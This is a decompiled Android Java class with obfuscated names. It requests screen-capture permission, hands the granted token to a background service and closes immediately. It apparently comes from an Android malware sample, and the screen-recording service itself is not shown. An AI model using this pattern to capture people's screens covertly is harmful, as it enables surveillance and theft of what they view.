package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;

public class cwwzcpcu extends Activity {

    /* renamed from: a */
    private MediaProjectionManager f547a;

    /* access modifiers changed from: protected */
    public void onActivityResult(int i, int i2, Intent intent) {
        if (i == 59706 && i2 == -1) {
            startService(new Intent(this, jkeggfql.class).putExtra("resultCode", i2).putExtra("resultIntent", intent));
        }
        finish();
    }

    /* access modifiers changed from: protected */
    @TargetApi(21)
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        this.f547a = (MediaProjectionManager) getSystemService("media_projection");
        startActivityForResult(this.f547a.createScreenCaptureIntent(), 59706);
    }
}
